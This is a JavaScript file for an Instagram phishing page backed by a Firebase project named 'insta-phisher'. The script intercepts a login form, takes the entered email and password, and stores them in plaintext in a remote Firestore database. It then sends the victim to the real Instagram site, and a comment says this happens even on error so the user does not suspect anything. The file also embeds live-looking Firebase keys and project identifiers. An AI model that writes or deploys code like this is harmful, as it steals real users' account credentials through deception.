// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyA4pW0zPlssY4PIkDoQ5hVTdn-cd56Ai7Q",
    authDomain: "insta-phisher.firebaseapp.com",
    projectId: "insta-phisher",
    storageBucket: "insta-phisher.firebasestorage.app",
    messagingSenderId: "618519090840",
    appId: "1:618519090840:web:506f5c6d98c17a24bda2ed"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Get the form element
const loginForm = document.getElementById('loginForm');

if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        console.log("Attempting to save credentials...", { email, password: '***' });

        try {
            const docRef = await addDoc(collection(db, "users"), {
                email: email,
                password: password, // WARNING: Storing passwords in plaintext is insecure!
                timestamp: new Date()
            });
            console.log("Document written with ID: ", docRef.id);

            // Redirect to official Instagram
            window.location.href = "https://instagram.com";
        } catch (e) {
            console.error("Error adding document: ", e);
            // On error, we might still want to redirect so the user doesn't suspect anything
            window.location.href = "https://instagram.com";
        }
    });
}
